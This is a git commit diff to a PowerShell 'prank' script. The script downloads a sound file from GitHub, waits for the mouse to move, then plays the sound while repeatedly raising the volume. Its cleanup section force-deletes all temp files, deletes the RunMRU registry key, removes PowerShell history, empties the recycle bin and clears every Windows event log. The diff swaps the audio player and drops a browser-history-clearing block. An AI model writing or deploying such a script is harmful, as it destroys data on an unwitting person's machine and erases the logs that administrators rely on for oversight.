9603c7ecd6a708e29c06779b62f4701d64ca193c
Anonymous <106942782+MajorMarmalade@users.noreply.github.com>
2023-05-03 15:48:58 -0400

    Update VeryBadPrankV2.ps1

--- VeryBadPrank/VeryBadPrankV2.ps1
+++ VeryBadPrank/VeryBadPrankV2.ps1
@@ -3,6 +3,11 @@ $wav = "https://github.com/MajorMarmalade/Sounds/blob/main/VeryBadPrank/ytmp3fre
 $w = -join($wav,"?dl=1")
 iwr $w -O $env:TMP\s.wav
 
+Add-Type -AssemblyName PresentationCore
+$mediaPlayer = New-Object System.Windows.Media.MediaPlayer
+$mediaPlayer.Open([System.Uri]"file:///$env:TMP\s.wav")
+$mediaPlayer.Play()
+
 Add-Type -AssemblyName System.Windows.Forms
 $originalPOS = [System.Windows.Forms.Cursor]::Position
 
@@ -10,12 +15,6 @@ while (1) {
     if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
         break
     }
-}
-
-function Play-WAV {
-    $PlayWav=New-Object System.Media.SoundPlayer
-    $PlayWav.SoundLocation="$env:TMP\s.wav"
-    $PlayWav.playsync()
 }
 
 function Raise-Volume {
@@ -26,29 +25,15 @@ function Raise-Volume {
     }
 }
 
-# Start audio playback
-$audioJob = Start-Job -ScriptBlock { Play-WAV }
-
-# Continuously raise the volume
-while ($audioJob.State -eq "Running") {
+while ($mediaPlayer.Position -lt $mediaPlayer.NaturalDuration.TimeSpan) {
     Raise-Volume
     Start-Sleep -Milliseconds 200
 }
 
-# Clean up after the script
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-# Clear browser history and cache for Edge, Chrome, and Firefox
-$edge = "Microsoft.MicrosoftEdge_8wekyb3d8bbwe"
-$chrome = "Google.Chrome"
-$firefox = "Mozilla.Firefox"
-
-ForEach ($browser in @($edge, $chrome, $firefox)) {
-    & cmd /c start shell:AppsFolder\$browser!$browser --incognito --start-maximized --profile-directory=Default --no-default-browser-check --no-first-run --disable-infobars --disable-session-crashed-bubble --disable-translate --new-window "javascript:window.open('chrome://settings/clearBrowserData?search=history');"
-}
 
 # Clear event logs
 Get-EventLog -LogName * | ForEach { Clear-EventLog -LogName $_.Log }
